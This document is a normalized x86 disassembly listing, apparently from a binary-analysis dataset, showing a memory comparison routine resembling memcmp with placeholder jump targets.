movzx eax [ edx + 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
add ecx 0x20
add edx 0x20
sub edi 0x20
movzx esi [ ecx + 0x1d ]
movzx eax [ edx + 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1b ]
movzx eax [ edx + 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1e ]
movzx eax [ edx + 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
movzx esi [ ecx + 0x1f ]
movzx eax [ edx + 0x1f ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
sub_44489e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_445d72 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
